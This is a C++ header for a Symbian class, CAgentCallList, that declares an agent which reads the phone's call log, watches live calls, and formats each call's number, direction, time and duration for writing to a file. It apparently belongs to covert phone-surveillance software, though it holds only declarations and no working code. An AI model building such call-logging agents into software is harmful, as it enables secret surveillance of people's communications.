/*
 * AgentCallList.h
 *
 *  Created on: 20/mag/2011
 *      Author: Giovanna
 */

#ifndef AGENTCALLLIST_H_
#define AGENTCALLLIST_H_

// INCLUDES

#include "AbstractAgent.h"
#include "CallLogReader.h"
#include "MonitorPhoneCall.h"
#include <HT\Logging.h>

// CLASS DECLARATION

/**
 *  CAgentCallList
 * 
 */
class CAgentCallList : public CAbstractAgent, public MCallLogCallBack, public MCallMonCallBack
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentCallList();

	/**
	 * Two-phased constructor.
	 */
	static CAgentCallList* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentCallList* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
	virtual void NotifyAgentCmdL(TUint32 aData);
		
private:
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentCallList();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);
	
	/*
	 * From MCallLogCallBack
	 */
    virtual void HandleCallLogEventL(TInt aDirection,const CLogEvent& aEvent);
    virtual void CallLogProcessed(TInt aError);
    
    /*
     * From MCallMonCallBack
     */
    virtual void NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber);
    virtual void NotifyDisconnectedCallStatusL();
    virtual void NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration,const TDesC& aNumber);
        	
    /*
     * Transform the information contained in the item in a buffer.
     * @return The buffer in proper format, ready to be written in the file.
     */
    HBufC8* GetCallLogBufferL(TInt aDirection, const CLogEvent& aEvent);
    HBufC8* GetCallLogBufferL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration,const TDesC& aNumber);
    
    /**
     * Transform the information contained in the item in a buffer.
     * @return The buffer in proper format, ready to be written in the file.
     */
    HBufC8* GetTTimeBufferL(const TTime aTime);

private:
	
    CCallLogReader*		iCallLogReader;
    CPhoneCallMonitor*	iCallMonitor;
    
    TTime iTimestamp;		// used for markup
    CLogFile* iMarkupFile;
    
    TBool iBelowFreespaceQuota;
    
    __FLOG_DECLARATION_MEMBER
	
	};


#endif /* AGENTCALLLIST_H_ */
